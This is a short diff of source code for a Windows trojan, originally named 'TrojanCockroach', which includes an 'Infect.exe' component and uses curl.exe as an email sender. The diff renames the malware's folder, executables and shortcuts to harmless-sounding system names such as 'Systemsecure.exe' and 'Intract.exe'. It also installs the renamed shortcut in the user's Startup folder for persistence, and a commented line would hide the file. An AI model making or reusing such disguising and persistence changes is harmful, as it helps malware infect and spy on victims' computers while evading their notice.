@@ -1,8 +1,8 @@
-#define FOLDER_NAME "trojan"  //containing folder
-#define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
-#define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
-#define INFECT_FILE_NAME "Infect.exe"  //infects computer
-#define INFECT_LINK_NAME "Infect.lnk"  //link file
+#define FOLDER_NAME "System"  //containing folder
+#define RUN_FILE_NAME "Systemsecure.exe"  //main run file
+#define RUN_LINK_NAME "Systemsecure.lnk"  //starter link
+#define INFECT_FILE_NAME "Intract.exe"  //infects computer
+#define INFECT_LINK_NAME "Intract.lnk"  //link file
 #define EMAIL_SENDER_FILE_NAME "curl.exe"  //email sender
 
 #include <windows.h>
@@ -93,7 +93,7 @@ main(){
         /////////////////////////////////////////////////////////
         char tasklnkauto[100] = {""};
         strcat(tasklnkauto, appdataFolder);
-        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TrojanCockroach.lnk");
+        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Systemsecure.lnk");
 
         std::cout<< CopyFile(runlnk_from, tasklnkauto, 0); std::cout << runlnk_from << " : " << tasklnkauto << std::endl;
         //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
